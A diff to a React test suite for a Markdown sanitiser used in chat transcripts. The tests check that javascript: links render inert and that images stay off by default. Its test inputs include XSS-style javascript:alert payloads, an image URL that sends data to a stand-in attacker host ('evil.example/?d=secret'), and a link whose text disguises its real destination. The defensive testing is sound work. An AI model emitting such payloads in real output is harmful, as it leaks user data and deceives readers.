@@ -43,7 +43,10 @@ describe("SafeMarkdown", () => {
 
   it("a javascript: link renders inert", () => {
     const { container } = render(
-      <SafeMarkdown markdown={"[x](javascript:alert(1)) and ![i](data:image/png;base64,AAAA) <javascript:alert(2)>"} />,
+      <SafeMarkdown
+        images
+        markdown={"[x](javascript:alert(1)) and ![i](data:image/png;base64,AAAA) <javascript:alert(2)>"}
+      />,
     );
     expect(container).toHaveTextContent("x");
     expect(container.querySelector("a[href]")).toBeNull();
@@ -65,7 +68,7 @@ describe("SafeMarkdown", () => {
   });
 
   it("keeps http(s) images, lazy and without a referrer", () => {
-    const { container } = render(<SafeMarkdown markdown={"![chart](https://img.example/c.png)"} />);
+    const { container } = render(<SafeMarkdown images markdown={"![chart](https://img.example/c.png)"} />);
     const img = container.querySelector("img");
     expect(img?.getAttribute("src")).toBe("https://img.example/c.png");
     expect(img?.getAttribute("alt")).toBe("chart");
@@ -76,6 +79,7 @@ describe("SafeMarkdown", () => {
   it("resolves relative Markdown links and images against the post", () => {
     const { container } = render(
       <SafeMarkdown
+        images
         markdown={"[next](/two) ![pic](img/p.png) [bad](javascript:x)"}
         base="https://blog.example/posts/one"
       />,
@@ -83,6 +87,33 @@ describe("SafeMarkdown", () => {
     expect(container.querySelector("a")?.getAttribute("href")).toBe("https://blog.example/two");
     expect(container.querySelector("img")?.getAttribute("src")).toBe("https://blog.example/posts/img/p.png");
     expect(container.querySelectorAll("a")).toHaveLength(1);
+  });
+
+  it("images are off unless asked for: an image is its alt text and host, never a load (R24)", () => {
+    const { container } = render(
+      <SafeMarkdown markdown={"![x](https://evil.example/?d=secret) ![](https://cdn.example/a.png) ![y](ftp://z)"} />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container).toHaveTextContent("x (evil.example)");
+    expect(container).toHaveTextContent("(cdn.example)");
+    expect(container).toHaveTextContent(/\by\b/);
+    expect(container.innerHTML).not.toContain("secret");
+  });
+
+  it("renderMarkdown (chat) shows where a link goes, and drops absurdly long ones", () => {
+    const long = `https://evil.example/?d=${"a".repeat(2100)}`;
+    const { container } = render(
+      <div>
+        {renderMarkdown(`[docs.python.org](https://evil.example/x) and [huge](${long}) ![i](https://e.example/i)`)}
+      </div>,
+    );
+    const links = container.querySelectorAll("a");
+    expect(links).toHaveLength(1);
+    expect(links[0]?.getAttribute("title")).toBe("https://evil.example/x");
+    expect(links[0]?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
+    expect(container).toHaveTextContent("docs.python.org (evil.example)");
+    expect(container).toHaveTextContent("huge");
+    expect(container.querySelector("img")).toBeNull();
   });
 
   it("renderMarkdown is the same renderer, for ChatTranscript", () => {
